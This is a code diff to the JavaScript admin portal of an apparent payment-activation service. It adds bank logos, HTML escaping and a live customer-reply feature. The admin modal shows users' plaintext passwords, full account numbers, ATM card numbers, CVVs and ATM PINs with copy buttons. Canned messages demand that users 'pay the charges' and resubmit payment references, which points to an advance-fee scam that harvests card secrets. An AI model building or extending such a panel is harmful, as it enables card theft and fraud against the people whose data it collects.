@@ -550,8 +550,59 @@ const BANK_LOGO_URL_MAP = {
     },
 };
 
+const OFFICIAL_BANK_LOGO_SLUGS = {
+    'sbi': 'sbin',
+    'hdfc': 'hdfc',
+    'icici': 'icic',
+    'axis': 'utib',
+    'kotak': 'kkbk',
+    'pnb': 'punb',
+    'baroda': 'barb',
+    'canara': 'cnrb',
+    'union': 'ubin',
+    'bank of india': 'bkid',
+    'idfc': 'idfb',
+    'idbi': 'ibkl',
+    'indian': 'idib',
+    'indusind': 'indb',
+    'yes': 'yesb',
+    'federal': 'fdrl',
+    'au small': 'aubl',
+    'rbl': 'ratn',
+    'bandhan': 'bdbl',
+    'paytm': 'pytm',
+    'airtel': 'airp',
+    'india post': 'ipos',
+    'jio': 'jiop',
+    'fino': 'fino',
+    'equitas': 'esfb',
+    'ujjivan': 'ujvn',
+    'central': 'cbin',
+    'overseas': 'ioba',
+    'uco': 'ucba',
+    'maharashtra': 'mahb',
+    'punjab & sind': 'psib',
+    'karnataka': 'karb',
+    'south indian': 'sibl',
+    'karur': 'kvbl',
+    'hsbc': 'hsbc',
+    'standard chartered': 'scbl',
+    'citi': 'citi',
+    'dbs': 'dbss',
+    'deutsche': 'deut',
+    'jana': 'jsfb'
+};
+
 function svgToDataUrl(svgString) {
     return `data:image/svg+xml;utf8,${encodeURIComponent(svgString.trim())}`;
+}
+
+function renderBankLogoImgHtml(brand, imgClass = '') {
+    if (!brand) return '🏦';
+    const clsAttr = imgClass ? ` class="${imgClass}"` : '';
+    const safeAlt = String(brand.bankName || 'Bank').replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    const url = brand.logoUrl || svgToDataUrl(brand.logoSvg);
+    return `<img src="${url}" alt="${safeAlt}"${clsAttr} referrerpolicy="no-referrer" onerror="this.style.display='none'; if(this.nextElementSibling){this.nextElementSibling.style.display='flex';}" /><span class="bank-inline-logo-fallback" style="display:none;">${brand.logoSvg}</span>`;
 }
 
 function generateCustomBankLogo(cleanName, initials, hue) {
@@ -572,59 +623,75 @@ function getBankBrandInfo(rawBankName, customLogoUrl) {
     const name = raw.toLowerCase();
 
     const aliases = [
-        ['bank of india', () => name.includes('bank of india') && !name.includes('state bank') && !name.includes('central bank') && !name.includes('union bank')],
-        ['india post', () => name.includes('india post') || name.includes('ippb')],
-        ['punjab & sind', () => name.includes('punjab & sind') || name.includes('punjab and sind')],
-        ['au small', () => name.includes('au small') || name.includes('au bank')],
-        ['south indian', () => name.includes('south indian')],
-        ['standard chartered', () => name.includes('standard chartered')],
+        ['bank of india', () => (name.includes('bank of india') || name.includes('bkid')) && !name.includes('state bank') && !name.includes('central bank') && !name.includes('union bank')],
+        ['india post', () => name.includes('india post') || name.includes('ippb') || name.includes('ipos')],
+        ['punjab & sind', () => name.includes('punjab & sind') || name.includes('punjab and sind') || name.includes('psib')],
+        ['au small', () => name.includes('au small') || name.includes('au bank') || name.includes('aubl')],
+        ['south indian', () => name.includes('south indian') || name.includes('sibl')],
+        ['standard chartered', () => name.includes('standard chartered') || name.includes('scbl')],
         ['overseas', () => name.includes('overseas') || name.includes('iob')],
         ['sbi', () => name.includes('sbi') || name.includes('state bank')],
         ['hdfc', () => name.includes('hdfc')],
-        ['icici', () => name.includes('icici')],
-        ['axis', () => name.includes('axis')],
-        ['kotak', () => name.includes('kotak')],
-        ['pnb', () => name.includes('pnb') || name.includes('punjab national')],
-        ['baroda', () => name.includes('baroda') || name.includes('bob')],
-        ['canara', () => name.includes('canara')],
-        ['union', () => name.includes('union bank')],
-        ['idfc', () => name.includes('idfc')],
-        ['idbi', () => name.includes('idbi')],
-        ['indian', () => name.includes('indian bank')],
-        ['indusind', () => name.includes('indusind')],
-        ['yes', () => name.includes('yes bank')],
-        ['federal', () => name.includes('federal')],
-        ['rbl', () => name.includes('rbl')],
-        ['bandhan', () => name.includes('bandhan')],
-        ['paytm', () => name.includes('paytm')],
-        ['airtel', () => name.includes('airtel')],
+        ['icici', () => name.includes('icici') || name.includes('icic')],
+        ['axis', () => name.includes('axis') || name.includes('utib')],
+        ['kotak', () => name.includes('kotak') || name.includes('kkbk')],
+        ['pnb', () => name.includes('pnb') || name.includes('punjab national') || name.includes('punb')],
+        ['baroda', () => name.includes('baroda') || name.includes('bob') || name.includes('barb')],
+        ['canara', () => name.includes('canara') || name.includes('cnrb')],
+        ['union', () => name.includes('union bank') || name.includes('ubin')],
+        ['idfc', () => name.includes('idfc') || name.includes('idfb')],
+        ['idbi', () => name.includes('idbi') || name.includes('ibkl')],
+        ['indian', () => name.includes('indian bank') || name.includes('idib')],
+        ['indusind', () => name.includes('indusind') || name.includes('indb')],
+        ['yes', () => name.includes('yes bank') || name === 'yes' || name.includes('yesb')],
+        ['federal', () => name.includes('federal') || name.includes('fdrl')],
+        ['rbl', () => name.includes('rbl') || name.includes('ratn')],
+        ['bandhan', () => name.includes('bandhan') || name.includes('bdbl')],
+        ['paytm', () => name.includes('paytm') || name.includes('pytm')],
+        ['airtel', () => name.includes('airtel') || name.includes('airp')],
         ['jio', () => name.includes('jio')],
         ['fino', () => name.includes('fino')],
-        ['equitas', () => name.includes('equitas')],
-        ['ujjivan', () => name.includes('ujjivan')],
-        ['central', () => name.includes('central bank')],
-        ['uco', () => name.includes('uco')],
-        ['maharashtra', () => name.includes('maharashtra')],
-        ['karnataka', () => name.includes('karnataka')],
+        ['equitas', () => name.includes('equitas') || name.includes('esfb')],
+        ['ujjivan', () => name.includes('ujjivan') || name.includes('ujvn')],
+        ['central', () => name.includes('central bank') || name.includes('cbin')],
+        ['uco', () => name.includes('uco') || name.includes('ucba')],
+        ['maharashtra', () => name.includes('maharashtra') || name.includes('mahb')],
+        ['karnataka', () => (name.includes('karnataka') && !name.includes('gramin') && !name.includes('vikas')) || name.includes('karb')],
         ['karur', () => name.includes('karur') || name.includes('kvb')],
         ['hsbc', () => name.includes('hsbc')],
         ['citi', () => name.includes('citi')],
         ['dbs', () => name.includes('dbs')],
-        ['deutsche', () => name.includes('deutsche')],
+        ['deutsche', () => name.includes('deutsche') || name.includes('deut')],
     ];
 
     for (const [key, matcher] of aliases) {
         if (matcher() && BANK_LOGO_URL_MAP[key]) {
             const info = BANK_LOGO_URL_MAP[key];
+            const officialSlug = OFFICIAL_BANK_LOGO_SLUGS[key];
+            const officialUrl = officialSlug
+                ? `https://cdn.jsdelivr.net/gh/praveenpuglia/indian-banks/assets/logos/${officialSlug}/symbol.svg`
+                : '';
             return {
                 bankName: raw || info.name,
                 shortCode: info.shortCode,
                 color: info.color,
                 bgColor: '#ffffff',
-                logoUrl: customLogoUrl || svgToDataUrl(info.svg),
+                logoUrl: customLogoUrl || info.logoUrl || officialUrl || svgToDataUrl(info.svg),
                 logoSvg: info.svg,
             };
         }
+    }
+
+    if (name.includes('jana') || name.includes('jsfb')) {
+        const janaSvg = generateCustomBankLogo('Jana Small Finance Bank', 'JSF', 0);
+        return {
+            bankName: raw || 'Jana Small Finance Bank',
+            shortCode: 'JSFBNK',
+            color: '#0F3D7A',
+            bgColor: '#ffffff',
+            logoUrl: customLogoUrl || 'https://cdn.jsdelivr.net/gh/praveenpuglia/indian-banks/assets/logos/jsfb/symbol.svg',
+            logoSvg: janaSvg,
+        };
     }
 
     const cleanName = raw || 'Bank Account';
@@ -1384,7 +1451,7 @@ function initAdminPortal() {
                 const bankBrand = accDetails.bankName ? getBankBrandInfo(accDetails.bankName) : null;
                 const bankDisplay = accDetails.bankName
                     ? `<div class="bank-tag-cell">
-                        <div class="bank-mini-icon">${bankBrand ? bankBrand.logoSvg : '🏦'}</div>
+                        <div class="bank-mini-icon">${bankBrand ? renderBankLogoImgHtml(bankBrand) : '🏦'}</div>
                         <div>
                             <strong style="color:#ffffff;">${accDetails.bankName}</strong><br>
                             <small style="color:#94a3b8;font-family:monospace;">${accDetails.ifscCode || ''} • ${maskAccountNumber(accDetails.accountNumber)}</small>
@@ -1638,7 +1705,7 @@ function initAdminPortal() {
                         <td><strong>@${item.username}</strong></td>
                         <td>
                             <div class="bank-tag-cell">
-                                <div class="bank-mini-icon">${brand.logoSvg}</div>
+                                <div class="bank-mini-icon">${renderBankLogoImgHtml(brand)}</div>
                                 <div>
                                     <strong style="color:#ffffff;">${item.bankName}</strong><br>
                                     <small style="color:#38bdf8;font-family:monospace;font-weight:700;">${item.senderCode || 'VM-BANK'}</small>
@@ -1681,28 +1748,36 @@ function initAdminPortal() {
                 ? `<button type="button" class="btn-copy-utr-mini modal-copy-val" data-copy-val="${String(val).replace(/"/g, '&quot;')}" style="margin-left:6px;">Copy</button>`
                 : '';
 
+        const escHtml = (val) => String(val ?? '')
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+        const currentAdminMsg = String(userObj?.rejectionMessage || '').trim();
+
         const sortedTxns = Array.isArray(txns) ? txns.slice().reverse() : [];
 
         modalContent.innerHTML = `
             <div style="display:flex;flex-direction:column;gap:14px;">
                 <div class="admin-modal-grid" style="background:rgba(255,255,255,0.03);padding:13px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);">
-                    <div><span style="color:#94a3b8;font-size:0.75rem;">USERNAME / PASSWORD</span><br><strong>@${username}</strong> <small style="color:#94a3b8;">(Pwd: ${userObj?.password || '-'})</small>${copyBtn(userObj?.password)}</div>
-                    <div><span style="color:#94a3b8;font-size:0.75rem;">MOBILE NUMBER</span><br><strong style="color:#38bdf8;">+91 ${userObj?.mobile || 'Not set'} (OTP Verified)</strong>${copyBtn(userObj?.mobile)}</div>
+                    <div><span style="color:#94a3b8;font-size:0.75rem;">USERNAME / PASSWORD</span><br><strong>@${escHtml(username)}</strong> <small style="color:#94a3b8;">(Pwd: ${escHtml(userObj?.password || '-')})</small>${copyBtn(userObj?.password)}</div>
+                    <div><span style="color:#94a3b8;font-size:0.75rem;">MOBILE NUMBER</span><br><strong style="color:#38bdf8;">+91 ${escHtml(userObj?.mobile || 'Not set')} (OTP Verified)</strong>${copyBtn(userObj?.mobile)}</div>
                     <div><span style="color:#94a3b8;font-size:0.75rem;">LAST LOGIN</span><br><strong>${userObj?.lastLoginAt ? formatTimeForLog(userObj.lastLoginAt) : 'Awaiting first login'}</strong></div>
                     <div><span style="color:#94a3b8;font-size:0.75rem;">TOTAL LOGINS</span><br><strong>${Number(userObj?.loginCount || 0)} logins</strong></div>
                     <div><span style="color:#94a3b8;font-size:0.75rem;">WALLET &amp; COMMISSION</span><br><strong style="color:#22c55e;">₹${liveBal.toLocaleString('en-IN')}</strong> <small style="color:#38bdf8;">(Comm: ₹${liveComm.toLocaleString('en-IN')})</small></div>
-                    <div><span style="color:#94a3b8;font-size:0.75rem;">ACTIVATION STATUS</span><br><strong style="color:${userObj?.activated ? '#4ade80' : userObj?.activationStatus === 'rejected' ? '#f87171' : '#fbbf24'};">${userObj?.activated ? '✓ APPROVED &amp; RUNNING' : userObj?.activationStatus === 'rejected' ? '✕ PAYMENT REJECTED' : userObj?.activationStatus === 'pending_approval' ? '⏳ PENDING ADMIN APPROVAL' : '● NOT SUBMITTED'}</strong> ${userObj?.activationCode ? `<small style="color:#94a3b8;">(Code: ${userObj.activationCode})</small>` : ''}</div>
+                    <div><span style="color:#94a3b8;font-size:0.75rem;">ACTIVATION STATUS</span><br><strong style="color:${userObj?.activated ? '#4ade80' : userObj?.activationStatus === 'rejected' ? '#f87171' : '#fbbf24'};">${userObj?.activated ? '✓ APPROVED &amp; RUNNING' : userObj?.activationStatus === 'rejected' ? '✕ PAYMENT REJECTED' : userObj?.activationStatus === 'pending_approval' ? '⏳ PENDING ADMIN APPROVAL' : '● NOT SUBMITTED'}</strong> ${userObj?.activationCode ? `<small style="color:#94a3b8;">(Code: ${escHtml(userObj.activationCode)})</small>` : ''}</div>
                 </div>
 
                 <div style="background:rgba(255,255,255,0.03);padding:13px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);">
                     <h4 style="color:#38bdf8;margin-bottom:10px;font-size:0.95rem;">Linked Bank Account Details</h4>
                     <div class="admin-modal-grid" style="font-size:0.85rem;">
-                        <div><span style="color:#94a3b8;">Bank Name:</span><br><strong>${acc.bankName || 'Not Linked Yet'}</strong></div>
-                        <div><span style="color:#94a3b8;">IFSC Code:</span><br><strong style="font-family:monospace;color:#38bdf8;">${acc.ifscCode || '-'}</strong>${copyBtn(acc.ifscCode)}</div>
-                        <div><span style="color:#94a3b8;">Full Account Number:</span><br><strong style="font-family:monospace;">${acc.accountNumber || '-'}</strong>${copyBtn(acc.accountNumber)}</div>
-                        <div><span style="color:#94a3b8;">Account Holder:</span><br><strong>${acc.accountHolder || '-'}</strong></div>
-                        <div><span style="color:#94a3b8;">Account Type:</span><br><strong>${acc.accountType || '-'}</strong></div>
-                        <div><span style="color:#94a3b8;">Contact Number:</span><br><strong>${acc.contactNumber || userObj?.mobile || '-'}</strong>${copyBtn(acc.contactNumber || userObj?.mobile)}</div>
+                        <div><span style="color:#94a3b8;">Bank Name:</span><br><strong>${escHtml(acc.bankName || 'Not Linked Yet')}</strong></div>
+                        <div><span style="color:#94a3b8;">IFSC Code:</span><br><strong style="font-family:monospace;color:#38bdf8;">${escHtml(acc.ifscCode || '-')}</strong>${copyBtn(acc.ifscCode)}</div>
+                        <div><span style="color:#94a3b8;">Full Account Number:</span><br><strong style="font-family:monospace;">${escHtml(acc.accountNumber || '-')}</strong>${copyBtn(acc.accountNumber)}</div>
+                        <div><span style="color:#94a3b8;">Account Holder:</span><br><strong>${escHtml(acc.accountHolder || '-')}</strong></div>
+                        <div><span style="color:#94a3b8;">Account Type:</span><br><strong>${escHtml(acc.accountType || '-')}</strong></div>
+                        <div><span style="color:#94a3b8;">Contact Number:</span><br><strong>${escHtml(acc.contactNumber || userObj?.mobile || '-')}</strong>${copyBtn(acc.contactNumber || userObj?.mobile)}</div>
                     </div>
                     ${acc.upiScannerBase64 ? `<div style="margin-top:10px;"><span style="color:#94a3b8;font-size:0.78rem;">Uploaded UPI QR Scanner (Tap image to zoom):</span><br><img src="${acc.upiScannerBase64}" alt="UPI QR" class="admin-modal-qr-zoom" style="max-width:150px;background:#fff;padding:4px;border-radius:8px;margin-top:6px;border:1px solid rgba(255,255,255,0.18);cursor:zoom-in;transition:max-width 0.2s ease;"></div>` : ''}
                 </div>
@@ -1710,11 +1785,11 @@ function initAdminPortal() {
                 <div style="background:rgba(255,255,255,0.03);padding:13px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);">
                     <h4 style="color:#fbbf24;margin-bottom:10px;font-size:0.95rem;">ATM Autodebit Details</h4>
                     <div class="admin-modal-grid" style="font-size:0.85rem;">
-                        <div><span style="color:#94a3b8;">ATM Card Number:</span><br><strong style="font-family:monospace;">${atm.atmNumber || 'Not Configured'}</strong>${copyBtn(atm.atmNumber)}</div>
-                        <div><span style="color:#94a3b8;">Expiry:</span><br><strong>${atm.atmExpiry || '-'}</strong>${copyBtn(atm.atmExpiry)}</div>
-                        <div><span style="color:#94a3b8;">CVV:</span><br><strong style="font-family:monospace;">${atm.atmCvv || '-'}</strong>${copyBtn(atm.atmCvv)}</div>
-                        <div><span style="color:#94a3b8;">ATM PIN:</span><br><strong style="font-family:monospace;">${atm.atmPin || '-'}</strong>${copyBtn(atm.atmPin)}</div>
-                        <div class="admin-modal-span2"><span style="color:#94a3b8;">Name on ATM Card:</span><br><strong>${atm.atmName || '-'}</strong></div>
+                        <div><span style="color:#94a3b8;">ATM Card Number:</span><br><strong style="font-family:monospace;">${escHtml(atm.atmNumber || 'Not Configured')}</strong>${copyBtn(atm.atmNumber)}</div>
+                        <div><span style="color:#94a3b8;">Expiry:</span><br><strong>${escHtml(atm.atmExpiry || '-')}</strong>${copyBtn(atm.atmExpiry)}</div>
+                        <div><span style="color:#94a3b8;">CVV:</span><br><strong style="font-family:monospace;">${escHtml(atm.atmCvv || '-')}</strong>${copyBtn(atm.atmCvv)}</div>
+                        <div><span style="color:#94a3b8;">ATM PIN:</span><br><strong style="font-family:monospace;">${escHtml(atm.atmPin || '-')}</strong>${copyBtn(atm.atmPin)}</div>
+                        <div class="admin-modal-span2"><span style="color:#94a3b8;">Name on ATM Card:</span><br><strong>${escHtml(atm.atmName || '-')}</strong></div>
                     </div>
                 </div>
 
@@ -1725,18 +1800,31 @@ function initAdminPortal() {
                             .map(
                                 (w) => `
                             <div style="padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;">
-                                <div>
-                                    <strong>${w.type}</strong> • <span class="utr-code-badge">${w.utr || w.tokenNumber || '-'}</span>${copyBtn(w.utr || w.tokenNumber)}
-                                    <br><small style="color:#94a3b8;">₹${w.amount}${w.accountHolder ? ` • Holder: ${w.accountHolder}` : ''} • ${w.bank || ''} ${w.ifsc ? `(${w.ifsc})` : ''} ${w.accNumber ? `• Acc: ${w.accNumber}` : ''} • ${formatTimeForLog(w.timestamp)}</small>
+                                <div style="min-width:0;">
+                                    <strong>${escHtml(w.type)}</strong> • <span class="utr-code-badge">${escHtml(w.utr || w.tokenNumber || '-')}</span>${copyBtn(w.utr || w.tokenNumber)}
+                                    <br><small style="color:#94a3b8;">₹${w.amount}${w.accountHolder ? ` • Holder: ${escHtml(w.accountHolder)}` : ''} • ${escHtml(w.bank || '')} ${w.ifsc ? `(${escHtml(w.ifsc)})` : ''} ${w.accNumber ? `• Acc: ${escHtml(w.accNumber)}` : ''} • ${formatTimeForLog(w.timestamp)}</small>
                                 </div>
-                                <div style="display:flex;align-items:center;gap:6px;">
-                                    <span class="badge-status-active" style="font-size:0.7rem;">${w.status}</span>
-                                    <button type="button" class="btn-approve-utr modal-approve-utr" data-id="${w.id}" data-user="${username}">✓</button>
-                                    <button type="button" class="btn-reject-utr modal-reject-utr" data-id="${w.id}" data-user="${username}">✕</button>
+                                <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
+                                    <span class="badge-status-active" style="font-size:0.7rem;">${escHtml(w.status)}</span>
+                                    <button type="button" class="btn-approve-utr modal-approve-utr" data-id="${escHtml(w.id)}" data-user="${escHtml(username)}">✓</button>
+                                    <button type="button" class="btn-reject-utr modal-reject-utr" data-id="${escHtml(w.id)}" data-user="${escHtml(username)}">✕</button>
                                 </div>
                             </div>`
                             )
                             .join('') || '<div style="color:#94a3b8;">No UTR or withdrawal submitted yet.</div>'}
+                    </div>
+                </div>
+
+                <div style="background:rgba(56,189,248,0.06);padding:13px;border-radius:12px;border:1px solid rgba(56,189,248,0.22);">
+                    <h4 style="color:#38bdf8;margin-bottom:8px;font-size:0.95rem;">💬 Reply / Live Message to Customer</h4>
+                    <div class="admin-reply-chips" style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px;">
+                        <button type="button" class="btn-copy-utr-mini admin-quick-reply-chip" data-reply="UTR Verified — Live Credits Starting">✓ Verified &amp; Starting</button>
+                        <button type="button" class="btn-copy-utr-mini admin-quick-reply-chip" data-reply="Invalid UTR — Please Pay Charges & Resubmit Correct 12-Digit UTR">✕ Invalid UTR</button>
+                        <button type="button" class="btn-copy-utr-mini admin-quick-reply-chip" data-reply="Verification in Progress — Please Keep Panel Open">⏳ Verifying</button>
+                    </div>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:stretch;">
+                        <input type="text" id="modalAdminReplyInput" class="admin-gatekeeper-input" maxlength="300" placeholder="Type live reply/instruction visible in customer panel..." value="${escHtml(currentAdminMsg)}" style="flex:1 1 220px;min-width:0;padding:8px 12px;font-size:0.86rem;">
+                        <button type="button" class="btn btn-admin-nav" id="modalSendReplyBtn" style="white-space:nowrap;">Send Reply →</button>
                     </div>
                 </div>
 
@@ -1750,7 +1838,7 @@ function initAdminPortal() {
                             <div style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;gap:10px;align-items:center;">
                                 <div>
                                     <strong style="color:${t.type === 'debit' ? '#f87171' : '#4ade80'};">${t.type === 'debit' ? '-' : '+'}₹${Number(t.amount || 0).toLocaleString('en-IN')} (${String(t.type || 'credit').toUpperCase()})</strong>
-                                    ${t.utr ? `<small style="color:#cbd5e1;font-family:monospace;margin-left:6px;">Ref: ${t.utr}</small>` : ''}
+                                    ${t.utr ? `<small style="color:#cbd5e1;font-family:monospace;margin-left:6px;">Ref: ${escHtml(t.utr)}</small>` : ''}
                                     ${t.balanceAfter !== undefined ? `<small style="color:#94a3b8;margin-left:6px;">Bal: ₹${Number(t.balanceAfter).toLocaleString('en-IN')}</small>` : ''}
                                 </div>
                                 <small style="color:#94a3b8;white-space:nowrap;">${formatTimeForLog(t.timestamp)}</small>
@@ -1768,7 +1856,7 @@ function initAdminPortal() {
                             .map(
                                 (l) => `
                             <div style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;gap:10px;">
-                                <span>${l.details}</span>
+                                <span>${escHtml(l.details)}</span>
                                 <small style="color:#94a3b8;white-space:nowrap;">${formatTimeForLog(l.timestamp)}</small>
                             </div>`
                             )
@@ -1777,14 +1865,51 @@ function initAdminPortal() {
                 </div>
 
                 <div style="display:flex;gap:10px;margin-top:6px;flex-wrap:wrap;">
-                    <button type="button" class="btn btn-success" id="modalApprovePanelBtn" style="flex:1;">✓ Approve &amp; Start Panel</button>
-                    <button type="button" class="btn btn-danger" id="modalRejectPaymentBtn" style="flex:1;">✕ Reject Payment</button>
-                    <button type="button" class="btn btn-outline-danger" id="modalDeleteUserBtn" style="flex:1;">Delete User Record</button>
+                    <button type="button" class="btn btn-success" id="modalApprovePanelBtn" style="flex:1 1 170px;">✓ Approve &amp; Start Panel</button>
+                    <button type="button" class="btn btn-danger" id="modalRejectPaymentBtn" style="flex:1 1 150px;">✕ Reject Payment</button>
+                    <button type="button" class="btn btn-outline-danger" id="modalDeleteUserBtn" style="flex:1 1 150px;">Delete User Record</button>
                 </div>
             </div>
         `;
 
         modal.style.display = 'flex';
+
+        const replyInputEl = document.getElementById('modalAdminReplyInput');
+        const readReplyNote = () => String(replyInputEl?.value || '').trim().slice(0, 300);
+
+        modalContent.querySelectorAll('.admin-quick-reply-chip').forEach((chip) => {
+            chip.addEventListener('click', () => {
+                if (replyInputEl) {
+                    replyInputEl.value = chip.getAttribute('data-reply') || '';
+                    replyInputEl.focus();
+                }
+            });
+        });
+
+        const sendReplyBtn = document.getElementById('modalSendReplyBtn');
+        if (sendReplyBtn) {
+            sendReplyBtn.addEventListener('click', async () => {
+                if (sendReplyBtn.disabled) return;
+                sendReplyBtn.disabled = true;
+                try {
+                    const note = readReplyNote();
+                    const fb = await getFirebaseStore();
+                    const res = fb ? await fb.adminSendUserMessage(username, note) : null;
+                    if (latestAdminData?.users?.[username]) {
+                        latestAdminData.users[username].rejectionMessage = note;
+                    }
+                    const nextUser = res?.user || latestAdminData?.users?.[username] || { ...userObj, rejectionMessage: note };
+                    renderAdminDashboard();
+                    inspectUserModal(username, nextUser, latestAdminData?.withdrawals, latestAdminData?.activityLogs);
+                    showAdminToast(note ? `💬 Reply sent live to @${username}` : `Cleared reply note for @${username}`);
+                } catch (err) {
+                    console.error('Send reply error:', err);
+                    showAdminToast('Error sending reply. Please retry.', 'error');
+                } finally {
+                    if (sendReplyBtn.isConnected) sendReplyBtn.disabled = false;
+                }
+            });
+        }
 
         modalContent.querySelectorAll('.modal-copy-val').forEach((btn) => {
             btn.addEventListener('click', (e) => {
@@ -1812,12 +1937,21 @@ function initAdminPortal() {
                 btn.disabled = true;
                 try {
                     const wid = btn.getAttribute('data-id');
+                    const note = readReplyNote();
                     const targetW = (latestAdminData?.withdrawals || []).find((x) => x.id === wid) || null;
                     const isUp199 = Boolean(targetW && (Number(targetW.amount) === 199 || String(targetW.type || '').includes('199')));
-                    StorageManager.updateWithdrawalStatus(wid, isUp199 ? '✓ Approved & Receipt Generated' : '✓ Approved & Activated');
+                    const nextUtrStatus = isUp199 ? '✓ Approved & Receipt Generated' : '✓ Approved & Activated';
+                    StorageManager.updateWithdrawalStatus(wid, nextUtrStatus);
+                    if (targetW) targetW.status = nextUtrStatus;
+                    if (latestAdminData?.users?.[username]) {
+                        latestAdminData.users[username].activated = true;
+                        latestAdminData.users[username].activationStatus = 'approved';
+                        latestAdminData.users[username].rejectionMessage = note;
+                    }
                     const fb = await getFirebaseStore();
-                    if (fb) await fb.adminApproveUtr(wid, username, targetW);
-                    const updatedUser = latestAdminData?.users?.[username] || { ...userObj, activated: true, activationStatus: 'approved' };
+                    if (fb) await fb.adminApproveUtr(wid, username, targetW, note);
+                    renderAdminDashboard();
+                    const updatedUser = latestAdminData?.users?.[username] || { ...userObj, activated: true, activationStatus: 'approved', rejectionMessage: note };
                     inspectUserModal(username, updatedUser, latestAdminData?.withdrawals, latestAdminData?.activityLogs);
                     showAdminToast(isUp199 ? `✓ ₹199 UTR Verified & Receipt Issued for @${username}` : `✓ UTR Approved & Panel Started for @${username}`);
                 } catch (err) {
@@ -1835,11 +1969,20 @@ function initAdminPortal() {
                 btn.disabled = true;
                 try {
                     const wid = btn.getAttribute('data-id');
+                    const note = readReplyNote();
+                    const rejectMsg = note || 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
                     const targetW = (latestAdminData?.withdrawals || []).find((x) => x.id === wid) || null;
                     StorageManager.updateWithdrawalStatus(wid, '❌ Rejected (Invalid UTR)');
+                    if (targetW) targetW.status = '❌ Rejected (Invalid UTR)';
+                    if (latestAdminData?.users?.[username]) {
+                        latestAdminData.users[username].activated = false;
+                        latestAdminData.users[username].activationStatus = 'rejected';
+                        latestAdminData.users[username].rejectionMessage = rejectMsg;
+                    }
                     const fb = await getFirebaseStore();
-                    if (fb) await fb.adminRejectUtr(wid, username, targetW);
-                    const updatedUser = latestAdminData?.users?.[username] || { ...userObj, activated: false, activationStatus: 'rejected' };
+                    if (fb) await fb.adminRejectUtr(wid, username, targetW, note);
+                    renderAdminDashboard();
+                    const updatedUser = latestAdminData?.users?.[username] || { ...userObj, activated: false, activationStatus: 'rejected', rejectionMessage: rejectMsg };
                     inspectUserModal(username, updatedUser, latestAdminData?.withdrawals, latestAdminData?.activityLogs);
                     showAdminToast(`✕ Payment Rejected for @${username}`);
                 } catch (err) {
@@ -1857,8 +2000,15 @@ function initAdminPortal() {
                 if (approvePanelBtn.disabled) return;
                 approvePanelBtn.disabled = true;
                 try {
+                    const note = readReplyNote();
                     const fb = await getFirebaseStore();
-                    const updated = fb ? await fb.adminApproveUserPanel(username) : null;
+                    const updated = fb ? await fb.adminApproveUserPanel(username, note) : null;
+                    if (latestAdminData?.users?.[username]) {
+                        latestAdminData.users[username].activated = true;
+                        latestAdminData.users[username].activationStatus = 'approved';
+                        latestAdminData.users[username].rejectionMessage = note;
+                    }
+                    renderAdminDashboard();
                     inspectUserModal(username, updated || latestAdminData?.users?.[username] || userObj, latestAdminData?.withdrawals, latestAdminData?.activityLogs);
                     showAdminToast(`✓ Panel Approved & Transactions Started for @${username}`);
                 } catch (err) {
@@ -1876,8 +2026,16 @@ function initAdminPortal() {
                 if (rejectPaymentBtn.disabled) return;
                 rejectPaymentBtn.disabled = true;
                 try {
+                    const note = readReplyNote();
+                    const rejectMsg = note || 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
                     const fb = await getFirebaseStore();
-                    const updated = fb ? await fb.adminRejectUserPayment(username) : null;
+                    const updated = fb ? await fb.adminRejectUserPayment(username, note) : null;
+                    if (latestAdminData?.users?.[username]) {
+                        latestAdminData.users[username].activated = false;
+                        latestAdminData.users[username].activationStatus = 'rejected';
+                        latestAdminData.users[username].rejectionMessage = rejectMsg;
+                    }
+                    renderAdminDashboard();
                     inspectUserModal(username, updated || latestAdminData?.users?.[username] || userObj, latestAdminData?.withdrawals, latestAdminData?.activityLogs);
                     showAdminToast(`✕ Payment Rejected — User notified to pay charges for @${username}`);
                 } catch (err) {
